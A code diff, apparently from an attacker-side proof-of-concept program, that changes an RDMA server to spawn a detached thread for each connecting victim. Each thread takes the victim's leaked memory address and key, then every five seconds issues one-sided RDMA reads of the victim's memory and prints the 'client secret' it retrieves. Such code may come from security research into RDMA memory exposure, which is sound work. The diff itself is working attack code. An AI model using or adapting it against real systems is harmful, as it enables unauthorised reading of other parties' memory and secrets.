@@ -54,6 +54,27 @@ parse(int argc, char* argv[])
   }
 }
 
+void track_region(VerbsEP *ep, void *ptr, struct ibv_mr *mr) {
+  struct ibv_wc wc;
+  struct ibv_sge* sges = (struct ibv_sge*)ptr;
+
+  struct ibv_sge sge = sges[0];
+ 
+  printf("Victim's secret should be at: %lu rkey %u \n",sge.addr ,sge.lkey);
+ 
+
+  /* new thread */
+  while(true){
+    int ret = ep->read_signaled(0, (uint64_t)ptr, mr->lkey, sge.addr, sge.lkey, 128);
+    assert(ret==0 && "Failed to issue an RDMA read.");
+    while( ep->poll_send_completion(&wc) == 0){
+
+    }
+    printf("[%d]client secret :  %s\n", wc.status, ptr );
+    std::this_thread::sleep_for(std::chrono::milliseconds(5000));
+  }
+}
+
 int main(int argc, char* argv[]){
  
   auto allparams = parse(argc,argv);
@@ -89,33 +110,21 @@ int main(int argc, char* argv[]){
   VerbsEP* ep = server->acceptEP(&attr,&conn_param,pd);
 
 
-  char* ptr = (char*)malloc(4096);
-  struct ibv_mr * mr = ep->reg_mem(ptr,4096);
-  
-  ep->post_recv(0,  mr);
-  
-  struct ibv_wc wc;
-  while( ep->poll_recv_completion(&wc) == 0){
-  
-  }
-  printf("Received memory information from a victim\n");
-
- 
-  struct ibv_sge* sges = (struct ibv_sge*)ptr;
-
-  struct ibv_sge sge = sges[0];
- 
-  printf("Victim's secret should be at: %lu rkey %u \n",sge.addr ,sge.lkey);
- 
-
-  while(true){
-    int ret = ep->read_signaled(0, (uint64_t)ptr, mr->lkey, sge.addr, sge.lkey, 128);
-    assert(ret==0 && "Failed to issue an RDMA read.");
-    while( ep->poll_send_completion(&wc) == 0){
-
+  while (true) {
+    printf("Waiting for new memory information from victim\n");
+    char* ptr = (char*)malloc(4096);
+    struct ibv_mr * mr = ep->reg_mem(ptr,4096);
+    
+    ep->post_recv(0,  mr);
+    
+    struct ibv_wc wc;
+    while( ep->poll_recv_completion(&wc) == 0){
+    
     }
-    printf("[%d]client secret :  %s\n", wc.status, ptr );
-    std::this_thread::sleep_for(std::chrono::milliseconds(5000));
+    printf("Received memory information from a victim\n");
+
+    std::thread t(track_region, ep, ptr, mr);
+    t.detach();
   }
 
   return 0; 
